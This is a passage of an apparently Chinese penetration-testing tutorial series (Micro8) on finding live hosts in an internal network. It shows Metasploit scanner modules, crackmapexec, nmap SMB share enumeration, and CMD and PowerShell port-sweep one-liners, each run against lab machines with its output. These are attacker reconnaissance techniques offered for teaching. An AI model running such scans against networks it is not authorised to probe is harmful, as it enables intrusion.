id="十：基于auxiliary-scanner-mysql-mysql-version发现mysql服务"><a href="#十：基于auxiliary-scanner-mysql-mysql-version发现mysql服务" class="headerlink" title="十：基于auxiliary/scanner/mysql/mysql_version发现mysql服务"></a>十：基于auxiliary/scanner/mysql/mysql_version发现mysql服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(scanner/mysql/mysql_version) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/mysql/mysql_version): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">RHOSTS 192.168.1.115 yes The target address range or CIDR identifier</span><br><span class="line">RPORT 3306 yes The target port (TCP)</span><br><span class="line">THREADS 50 yes The number of concurrent threads </span><br><span class="line"></span><br><span class="line">msf auxiliary(scanner/mysql/mysql_version) &gt; exploit </span><br><span class="line"></span><br><span class="line">[+] 192.168.1.115:3306 ‐ 192.168.1.115:3306 is running MySQL 5.1.52‐community (protocol 10)</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p><img src="../do/media/d25ea6b152f71fa64120456845df5597.jpg" alt></p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>23、基于MSF发现内网存活主机第一季</title>
      <link href="/article/23_%E5%9F%BA%E4%BA%8EMSF%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E7%AC%AC%E4%B8%80%E5%AD%A3.html"/>
      <url>/article/23_%E5%9F%BA%E4%BA%8EMSF%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E7%AC%AC%E4%B8%80%E5%AD%A3.html</url>
      
        <content type="html"><![CDATA[<p><strong>注：</strong>请多喝点热水或者凉白开，可预防<strong>肾结石，通风</strong>等。<br>痛风可伴发肥胖症、高血压病、糖尿病、脂代谢紊乱等多种代谢性疾病。</p><p><strong>攻击机：</strong><br>192.168.1.5 Debian</p><p><strong>靶机：</strong><br>192.168.1.2 Windows 7<br>192.168.1.119 Windows 2003</p><h3 id="MSF的search支持type搜索："><a href="#MSF的search支持type搜索：" class="headerlink" title="MSF的search支持type搜索："></a>MSF的search支持type搜索：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search scanner type:auxiliary </span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================ </span><br><span class="line"></span><br><span class="line">Name Disclosure Date Rank Check Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐ ‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">auxiliary/admin/appletv/appletv_display_image normal No Apple TV Image Remote Control</span><br><span class="line">auxiliary/admin/appletv/appletv_display_video normal No Apple TV Video Remote Control</span><br><span class="line">auxiliary/admin/smb/check_dir_file normal Yes SMB Scanner CheckFile/Directory Utility</span><br><span class="line">auxiliary/admin/teradata/teradata_odbc_sql 2018‐03‐29 normal Yes Teradata ODBC SQL Query Module</span><br><span class="line">auxiliary/bnat/bnat_scan normal Yes BNAT Scanner</span><br><span class="line">auxiliary/gather/citrix_published_applications normal No Citrix MetaFrame ICA Published Applications Scanner</span><br><span class="line">auxiliary/gather/enum_dns normal No DNS Record Scanner and Enumerator</span><br><span class="line">....</span><br><span class="line">auxiliary/scanner/winrm/winrm_cmd normal Yes WinRM Command Runner</span><br><span class="line">auxiliary/scanner/winrm/winrm_login normal Yes WinRM Login Utility</span><br><span class="line">auxiliary/scanner/winrm/winrm_wql normal Yes WinRM WQL Query Runner</span><br><span class="line">auxiliary/scanner/wproxy/att_open_proxy 2017‐08‐31 normal Yes Open WAN‐to‐LAN proxy on AT&amp;T routers</span><br><span class="line">auxiliary/scanner/wsdd/wsdd_query normal Yes WS‐Discovery Information Discovery</span><br><span class="line">auxiliary/scanner/x11/open_x11 normal Yes X11 No‐Auth Scanner</span><br></pre></td></tr></table></figure><p><img src="../do/media/a25502ba38f084a0edddd759473d4921.jpg" alt></p><p><strong>第一季主要介绍 scanner 下的五个模块，辅助发现内网存活主机，分别为：</strong></p><ul><li>auxiliary/scanner/discovery/arp_sweep </li><li>auxiliary/scanner/discovery/udp_sweep</li><li>auxiliary/scanner/ftp/ftp_version </li><li>auxiliary/scanner/http/http_version</li><li>auxiliary/scanner/smb/smb_version</li></ul><h3 id="一：基于scanner-http-http-version发现HTTP服务"><a href="#一：基于scanner-http-http-version发现HTTP服务" class="headerlink" title="一：基于scanner/http/http_version发现HTTP服务"></a>一：基于scanner/http/http_version发现HTTP服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(scanner/http/http_version) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/http/http_version): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">Proxies no A proxy chain of format type:host:port[,type:host:port] [...]</span><br><span class="line">RHOSTS 192.168.1.0/24 yes The target address range or CIDR identifier</span><br><span class="line">RPORT 80 yes The target port (TCP)</span><br><span class="line">SSL false no Negotiate SSL/TLS for outgoing connections</span><br><span class="line">THREADS 20 yes The number of concurrent threads</span><br><span class="line">VHOST no HTTP server virtual host </span><br><span class="line"></span><br><span class="line">msf auxiliary(scanner/http/http_version) &gt; exploit </span><br><span class="line"></span><br><span class="line">[+] 192.168.1.1:80</span><br><span class="line">[*] Scanned 27 of 256 hosts (10% complete)</span><br><span class="line">[*] Scanned 63 of 256 hosts (24% complete)</span><br><span class="line">[*] Scanned 82 of 256 hosts (32% complete)</span><br><span class="line">[*] Scanned 103 of 256 hosts (40% complete)</span><br><span class="line">[+] 192.168.1.119:80 Microsoft‐IIS/6.0 ( Powered by ASP.NET )</span><br><span class="line">[*] Scanned 129 of 256 hosts (50% complete)</span><br><span class="line">[*] Scanned 154 of 256 hosts (60% complete)</span><br><span class="line">[*] Scanned 182 of 256 hosts (71% complete)</span><br><span class="line">[*] Scanned 205 of 256 hosts (80% complete)</span><br><span class="line">[*] Scanned 231 of 256 hosts (90% complete)</span><br><span class="line">[*] Scanned 256 of 256 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p><img src="../do/media/15b17e700bde4540e5b51959a3e15de5.jpg" alt></p><h3 id="二：基于scanner-smb-smb-version发现SMB服务"><a href="#二：基于scanner-smb-smb-version发现SMB服务" class="headerlink" title="二：基于scanner/smb/smb_version发现SMB服务"></a>二：基于scanner/smb/smb_version发现SMB服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(scanner/smb/smb_version) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/smb/smb_version): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">RHOSTS 192.168.1.0/24 yes The target address range or CIDR identifier</span><br><span class="line">SMBDomain . no The Windows domain to use for authentication</span><br><span class="line">SMBPass no The password for the specified username</span><br><span class="line">SMBUser no The username to authenticate as</span><br><span class="line">THREADS 20 yes The number of concurrent threads </span><br><span class="line"></span><br><span class="line">msf auxiliary(scanner/smb/smb_version) &gt; exploit </span><br><span class="line"></span><br><span class="line">[+] 192.168.1.2:445 ‐ Host is running Windows 7 Ultimate SP1 (build:7601) (name:JOHN‐PC) (workgroup:WORKGROUP )</span><br><span class="line">[*] Scanned 40 of 256 hosts (15% complete)</span><br><span class="line">[*] Scanned 60 of 256 hosts (23% complete)</span><br><span class="line">[*] Scanned 79 of 256 hosts (30% complete)</span><br><span class="line">[+] 192.168.1.119:445 ‐ Host is running Windows 2003 R2 SP2 (build:3790) (name:WIN03X64)</span><br><span class="line">[*] Scanned 103 of 256 hosts (40% complete)</span><br><span class="line">[*] Scanned 128 of 256 hosts (50% complete)</span><br><span class="line">[*] Scanned 154 of 256 hosts (60% complete)</span><br><span class="line">[*] Scanned 181 of 256 hosts (70% complete)</span><br><span class="line">[*] Scanned 206 of 256 hosts (80% complete)</span><br><span class="line">[*] Scanned 231 of 256 hosts (90% complete)</span><br><span class="line">[*] Scanned 256 of 256 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p><img src="../do/media/db717c6c50914ce513a94fe211bf620b.jpg" alt></p><h3 id="三：基于scanner-ftp-ftp-version发现FTP服务"><a href="#三：基于scanner-ftp-ftp-version发现FTP服务" class="headerlink" title="三：基于scanner/ftp/ftp_version发现FTP服务"></a>三：基于scanner/ftp/ftp_version发现FTP服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(scanner/ftp/ftp_version) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/ftp/ftp_version): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">FTPPASS mozilla@example.com no The password for the specified username</span><br><span class="line">FTPUSER anonymous no The username to authenticate as</span><br><span class="line">RHOSTS 192.168.1.0/24 yes The target address range or CIDR identifier</span><br><span class="line">RPORT 21 yes The target port (TCP)</span><br><span class="line">THREADS 50 yes The number of concurrent threads </span><br><span class="line"></span><br><span class="line">msf auxiliary(scanner/ftp/ftp_version) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Scanned 51 of 256 hosts (19% complete)</span><br><span class="line">[*] Scanned 52 of 256 hosts (20% complete)</span><br><span class="line">[*] Scanned 100 of 256 hosts (39% complete)</span><br><span class="line">[+] 192.168.1.119:21 ‐ FTP Banner: &apos;220 Microsoft FTP Service\x0d\x0a&apos;</span><br><span class="line">[*] Scanned 103 of 256 hosts (40% complete)</span><br><span class="line">[*] Scanned 133 of 256 hosts (51% complete)</span><br><span class="line">[*] Scanned 183 of 256 hosts (71% complete)</span><br><span class="line">[*] Scanned 197 of 256 hosts (76% complete)</span><br><span class="line">[*] Scanned 229 of 256 hosts (89% complete)</span><br><span class="line">[*] Scanned 231 of 256 hosts (90% complete)</span><br><span class="line">[*] Scanned 256 of 256 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p><img src="../do/media/f6190ef2a7165ce148af70d8fde88ddc.jpg" alt></p><h3 id="四：基于scanner-discovery-arp-sweep发现内网存活主机"><a href="#四：基于scanner-discovery-arp-sweep发现内网存活主机" class="headerlink" title="四：基于scanner/discovery/arp_sweep发现内网存活主机"></a>四：基于scanner/discovery/arp_sweep发现内网存活主机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(scanner/discovery/arp_sweep) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/discovery/arp_sweep): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">INTERFACE no The name of the interface</span><br><span class="line">RHOSTS 192.168.1.0/24 yes The target address range or CIDR identifier</span><br><span class="line">SHOST no Source IP Address</span><br><span class="line">SMAC no Source MAC Address</span><br><span class="line">THREADS 50 yes The number of concurrent threads</span><br><span class="line">TIMEOUT 5 yes The number of seconds to wait for new data </span><br><span class="line"></span><br><span class="line">msf auxiliary(scanner/discovery/arp_sweep) &gt; exploit </span><br><span class="line"></span><br><span class="line">[+] 192.168.1.1 appears to be up (UNKNOWN).</span><br><span class="line">[+] 192.168.1.2 appears to be up (UNKNOWN).</span><br><span class="line">[+] 192.168.1.119 appears to be up (VMware, Inc.).</span><br><span class="line">[*] Scanned 256 of 256 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p><img src="../do/media/ffadf4bf3cace0a835ea5e7ce94ea68e.jpg" alt></p><h3 id="五：基于scanner-discovery-udp-sweep发现内网存活主机"><a href="#五：基于scanner-discovery-udp-sweep发现内网存活主机" class="headerlink" title="五：基于scanner/discovery/udp_sweep发现内网存活主机"></a>五：基于scanner/discovery/udp_sweep发现内网存活主机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(scanner/discovery/udp_sweep) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/discovery/udp_sweep): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">BATCHSIZE 256 yes The number of hosts to probe in each set</span><br><span class="line">RHOSTS 192.168.1.0/24 yes The target address range or CIDR identifier</span><br><span class="line">THREADS 50 yes The number of concurrent threads </span><br><span class="line"></span><br><span class="line">msf auxiliary(scanner/discovery/udp_sweep) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Sending 13 probes to 192.168.1.0‐&gt;192.168.1.255 (256 hosts)</span><br><span class="line">[*] Discovered DNS on 192.168.1.1:53 (ce2a8500000100010000000007564552  53494f4e0442494e440000100003c00c0010000300000001001a19737572656c7920796f7</span><br><span class="line">5206d757374206265206a6f6b696e67)</span><br><span class="line">[*] Discovered NetBIOS on 192.168.1.2:137 (JOHN‐PC:&lt;00&gt;:U :WORKGROUP:&lt;00&gt;:G :JOHN‐PC:&lt;20&gt;:U :WORKGROUP:&lt;1e&gt;:G :WORKGROUP:&lt;1d&gt;:U</span><br><span class="line">:__MSBROWSE__ &lt;01&gt;:G :4c:cc:6a:e3:51:27)</span><br><span class="line">[*] Discovered NetBIOS on 192.168.1.119:137 (WIN03X64:&lt;00&gt;:U :WIN03X64:&lt;20&gt;:U :WORKGROUP:&lt;00&gt;:G :WORKGROUP:&lt;1e&gt;:G :WIN03X64:&lt;03&gt;:U</span><br><span class="line">:ADMINISTRA TOR:&lt;03&gt;:U :WIN03X64:&lt;01&gt;:U :00:0c:29:85:d6:7d)</span><br><span class="line">[*] Scanned 256 of 256 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p><img src="../do/media/30316c44faf3c6dacacfb382a5ffdc94.jpg" alt></p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>22、基于SMB发现内网存活主机</title>
      <link href="/article/22_%E5%9F%BA%E4%BA%8ESMB%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA.html"/>
      <url>/article/22_%E5%9F%BA%E4%BA%8ESMB%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA.html</url>
      
        <content type="html"><![CDATA[<h3 id="基于msf"><a href="#基于msf" class="headerlink" title="基于msf"></a>基于msf</h3><p>模块：<br><code>scanner/smb/smb_version</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(scanner/smb/smb_version) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/smb/smb_version): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">RHOSTS 192.168.1.0/24 yes The target address range or CIDR identifier</span><br><span class="line">SMBDomain . no The Windows domain to use for authentication</span><br><span class="line">SMBPass no The password for the specified username</span><br><span class="line">SMBUser no The username to authenticate as</span><br><span class="line">THREADS 1 yes The number of concurrent threads </span><br><span class="line"></span><br><span class="line">msf auxiliary(scanner/smb/smb_version) &gt; set threads 20</span><br><span class="line">threads =&gt; 20</span><br><span class="line">msf auxiliary(scanner/smb/smb_version) &gt; exploit </span><br><span class="line"></span><br><span class="line">[+] 192.168.1.4:445 ‐ Host is running Windows 7 Ultimate SP1 (build:7601) (name:XXXXXX) (workgroup:WORKGROUP )</span><br><span class="line">[*] Scanned 39 of 256 hosts (15% complete)</span><br><span class="line">[*] Scanned 61 of 256 hosts (23% complete)</span><br><span class="line">[*] Scanned 81 of 256 hosts (31% complete)</span><br><span class="line">[+] 192.168.1.99:445 ‐ Host is running Windows 7 Ultimate SP1 (build:7601) (name:XXXXXX) (workgroup:WORKGROUP )</span><br><span class="line">[+] 192.168.1.119:445 ‐ Host is running Windows 2003 R2 SP2 (build:3790) (name:XXXXXX)</span><br><span class="line">[*] Scanned 103 of 256 hosts (40% complete)</span><br><span class="line">[*] Scanned 130 of 256 hosts (50% complete)</span><br><span class="line">[*] Scanned 154 of 256 hosts (60% complete)</span><br><span class="line">[*] Scanned 181 of 256 hosts (70% complete)</span><br><span class="line">[*] Scanned 205 of 256 hosts (80% complete)</span><br><span class="line">[*] Scanned 232 of 256 hosts (90% complete)</span><br><span class="line">[*] Scanned 256 of 256 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed </span><br><span class="line">```  </span><br><span class="line">![](../do/media/c4d807b384fa3fbd0de85b80b2a38e59.jpg)</span><br><span class="line"></span><br><span class="line">### 基于cme（参考第九十三课）</span><br><span class="line">```code</span><br><span class="line">root@John:~# cme smb 192.168.1.0/24</span><br><span class="line">SMB 192.168.1.4 445 JOHN‐PC [*] Windows 7 Ultimate 7601 Service Pack 1</span><br><span class="line">x64 (name:JOHN‐PC) (domain:JOHN‐PC) (signing:False) (SMBv1:True)</span><br><span class="line">SMB 192.168.1.99 445 JOHN‐PC [*] Windows 7 Ultimate 7601 Service Pack</span><br><span class="line">x64 (name:JOHN‐PC) (domain:JOHN‐PC) (signing:False) (SMBv1:True)</span><br><span class="line">SMB 192.168.1.119 445 WIN03X64 [*] Windows Server 2003 R2 3790 Service</span><br><span class="line">Pack 2 x32 (name:WIN03X64) (domain:WIN03X64) (signing:False) (SMBv1:True</span><br><span class="line">```  </span><br><span class="line">![](../do/media/5206dc9e56a970261d19557e81a2dd73.jpg)</span><br><span class="line"></span><br><span class="line">### 基于nmap</span><br><span class="line">```code</span><br><span class="line">root@John:~# nmap ‐sU ‐sS ‐‐script smb‐enum‐shares.nse ‐p 445 192.168.1.119</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2019‐01‐29 08:45 EST</span><br><span class="line">Nmap scan report for 192.168.1.119</span><br><span class="line">Host is up (0.0029s latency). </span><br><span class="line"></span><br><span class="line">PORT STATE SERVICE</span><br><span class="line">445/tcp open microsoft‐ds</span><br><span class="line">445/udp open|filtered microsoft‐ds</span><br><span class="line">MAC Address: 00:0C:29:85:D6:7D (VMware) </span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb‐enum‐shares:</span><br><span class="line">| account_used: guest</span><br><span class="line">| \\192.168.1.119\ADMIN$:</span><br><span class="line">| Type: STYPE_DISKTREE_HIDDEN</span><br><span class="line">| Comment: \xE8\xBF\x9C\xE7\xA8\x8B\xE7\xAE\xA1\xE7\x90\x86</span><br><span class="line">| Anonymous access: &lt;none&gt;</span><br><span class="line">| Current user access: &lt;none&gt;</span><br><span class="line">| \\192.168.1.119\C$:</span><br><span class="line">| Type: STYPE_DISKTREE_HIDDEN</span><br><span class="line">| Comment: \xE9\xBB\x98\xE8\xAE\xA4\xE5\x85\xB1\xE4\xBA\xAB</span><br><span class="line">| Anonymous access: &lt;none&gt;</span><br><span class="line">| Current user access: &lt;none&gt;</span><br><span class="line">| \\192.168.1.119\E$:</span><br><span class="line">| Type: STYPE_DISKTREE_HIDDEN</span><br><span class="line">| Comment: \xE9\xBB\x98\xE8\xAE\xA4\xE5\x85\xB1\xE4\xBA\xAB</span><br><span class="line">| Anonymous access: &lt;none&gt;</span><br><span class="line">| Current user access: &lt;none&gt;</span><br><span class="line">| \\192.168.1.119\IPC$:</span><br><span class="line">| Type: STYPE_IPC_HIDDEN</span><br><span class="line">| Comment: \xE8\xBF\x9C\xE7\xA8\x8B IPC</span><br><span class="line">| Anonymous access: READ</span><br><span class="line">| Current user access: READ/WRITE</span><br><span class="line">| \\192.168.1.119\share:</span><br><span class="line">| Type: STYPE_DISKTREE</span><br><span class="line">| Comment:</span><br><span class="line">| Anonymous access: &lt;none&gt;</span><br><span class="line">|_ Current user access: READ/WRITE </span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1.24 seconds </span><br><span class="line">```  </span><br><span class="line">![](../do/media/3fd308a951925bf5a20f8f6568f1c84a.jpg)</span><br><span class="line"></span><br><span class="line">### 基于CMD：</span><br><span class="line">```code</span><br><span class="line">for /l %a in (1,1,254) do start /min /low telnet 192.168.1.%a 445</span><br></pre></td></tr></table></figure><p><img src="../do/media/eab2b645fe2065a540c49a842dfd2ecf.jpg" alt></p><h3 id="基于powershell："><a href="#基于powershell：" class="headerlink" title="基于powershell："></a>基于powershell：</h3><p>一句话扫描：<br>单IP：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">445 | %&#123; echo ((new‐object Net.Sockets.TcpClient).Connect(&quot;192.168.1.1</span><br><span class="line">19&quot;,$_)) &quot;$_ is open&quot;&#125; 2&gt;$null</span><br></pre></td></tr></table></figure><p><img src="../do/media/7c6b67ffd6f089b88778bb732f0bf949.jpg" alt></p><p>多ip：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1..5 | % &#123; $a = $_; 445 | % &#123;echo ((new‐object</span><br><span class="line">Net.Sockets.TcpClient).Connect(&quot;192.168.1.$a&quot;,$_)) &quot;Port $_ is open&quot;&#125;</span><br><span class="line">2&gt;$null&#125;</span><br></pre></td></tr></table></figure><p><img src="../do/media/9d87d933207df8058f867f3d208a30a1.jpg" alt></p><p>多port，多IP：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">118..119 | % &#123; $a = $_; write‐host &quot;‐‐‐‐‐‐&quot;; write‐host</span><br><span class="line">&quot;192.168.1.$a&quot;; 80,445 | % &#123;echo ((new‐object Net.Sockets.TcpClient).Conn</span><br><span class="line">ect(&quot;192.168.1.$a&quot;,$_)) &quot;Port $_ is open&quot;&#125; 2&gt;$null&#125;</span><br></pre></td></tr></table></figure><p><img src="../do/media/fd7db2c22f6d1deac9303d3bdbabcd4f.jpg" alt>  </p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>21、基于ICMP发现内网存活主机</title>
      <link href="/article/21_%E5%9F%BA%E4%BA%8EICMP%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA.html"/>
